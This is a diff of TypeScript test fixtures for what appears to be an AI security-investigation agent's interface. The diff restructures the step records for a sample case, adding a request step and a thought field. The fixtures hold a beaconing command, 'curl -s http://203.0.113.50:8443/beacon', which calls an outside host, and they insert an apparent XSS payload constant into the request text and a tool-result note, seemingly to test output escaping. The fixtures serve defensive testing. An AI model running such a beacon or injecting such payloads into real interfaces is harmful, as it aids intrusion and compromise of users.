@@ -90,25 +90,32 @@ export const INVESTIGATIONS_41: S["Investigations"] = {
                  result_excerpt: "curl -s http://203.0.113.50:8443/beacon", captured_at: T0 }],
     evidence_hash: "e".repeat(64), completed_at: T0,
     steps: [
-      { index: 0, kind: "llm", name: "plan", started_at: T0, duration_ms: 1840, tokens_in: 2310, tokens_out: 212,
+      { index: 0, kind: "request", name: "request", started_at: T0, duration_ms: 0, tokens_in: 0, tokens_out: 0,
+        summary: "the question given to the agent" },
+      { index: 1, kind: "llm", name: "plan", started_at: T0, duration_ms: 1840, tokens_in: 2310, tokens_out: 212,
         summary: "Decide which tools to call." },
-      { index: 1, kind: "tool", name: "edr.process_tree", started_at: T0, duration_ms: 120, tokens_in: 0,
+      { index: 2, kind: "tool", name: "edr.process_tree", started_at: T0, duration_ms: 120, tokens_in: 0,
         tokens_out: 0, summary: "Process tree." },
-      { index: 2, kind: "llm", name: "verdict", started_at: T0, duration_ms: 2410, tokens_in: 3120,
+      { index: 3, kind: "llm", name: "verdict", started_at: T0, duration_ms: 2410, tokens_in: 3120,
         tokens_out: 388, summary: "Verdict: malicious." },
     ],
   },
 };
 
 /** The full steps of INVESTIGATIONS_41's latest run, by index, as GET /investigations/{id}/steps/{index} returns them. */
+// typed, not cast, so a field the contract adds has to be filled in here too
+const steps41: Omit<S["StepDetail"], "investigation_id">[] = [
+  { index: 0, kind: "request", name: "request", text: `Case 41: 3 alert(s) on host(s) web-srv-01. ${XSS}`,
+    thought: null, args: null, result: null, error: null },
+  { index: 1, kind: "llm", name: "plan", text: null, thought: "The alert is on web-srv-01; start with its process tree.",
+    args: null, result: null, error: null },
+  { index: 2, kind: "tool", name: "edr.process_tree", text: null, thought: null, args: { host: "web-srv-01", pid: 4312 },
+    result: { found: true, process: { cmdline: "curl -s http://203.0.113.50:8443/beacon" }, note: XSS }, error: null },
+  { index: 3, kind: "llm", name: "verdict", text: "Beaconing confirmed; submitting.", thought: null, args: null,
+    result: null, error: null },
+];
 export const STEPS_41: Record<number, S["StepDetail"]> = Object.fromEntries(
-  [
-    { index: 0, kind: "llm", name: "plan", text: null, args: null, result: null, error: null },
-    { index: 1, kind: "tool", name: "edr.process_tree", text: null, args: { host: "web-srv-01", pid: 4312 },
-      result: { found: true, process: { cmdline: "curl -s http://203.0.113.50:8443/beacon" }, note: XSS }, error: null },
-    { index: 2, kind: "llm", name: "verdict", text: "Beaconing confirmed; submitting.", args: null, result: null,
-      error: null },
-  ].map((s) => [s.index, { investigation_id: "aaaaaaaa-0000-0000-0000-000000000041", ...s } as S["StepDetail"]]),
+  steps41.map((s) => [s.index, { investigation_id: "aaaaaaaa-0000-0000-0000-000000000041", ...s }]),
 );
 
 export function proposal(over: Partial<Proposal> = {}): Proposal {
